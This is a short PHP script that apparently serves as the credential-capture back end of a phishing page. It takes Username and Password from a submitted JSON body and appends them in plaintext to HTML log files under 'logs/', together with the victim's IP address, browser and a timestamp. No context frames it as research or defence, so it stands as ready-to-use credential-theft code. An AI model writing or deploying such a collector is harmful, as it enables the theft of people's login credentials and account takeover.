<?php
$JDecode = json_decode(file_get_contents('php://input'),true); 
$username= $JDecode["Username"];
$password=  $JDecode["Password"];
$iplogfile = 'logs/request-info.html';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$webpage = $_SERVER['SCRIPT_NAME'];
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen($iplogfile, 'a+');
fwrite($fp, '</h></p><h style="color:white;">Time : ['.$timestamp.'] <p>Username : '.$username.' </p><p>Password : '.$password.' </p><p>IP : '.$ipaddress.' </p><p>Website : '.$webpage.' </p><p>Browser : '.$browser."\n\n<br><br>");
fclose($fp);
$visitor = 'logs/visitor-info.html';
$pilih = fopen($visitor, 'a+');
fwrite($pilih, '</h></p><h style="color:white;">Time : ['.$timestamp.'] <p> Username : '.$username.' </p><p>Password : '.$password."\n\n<br><br>");
fclose($pilih);
?>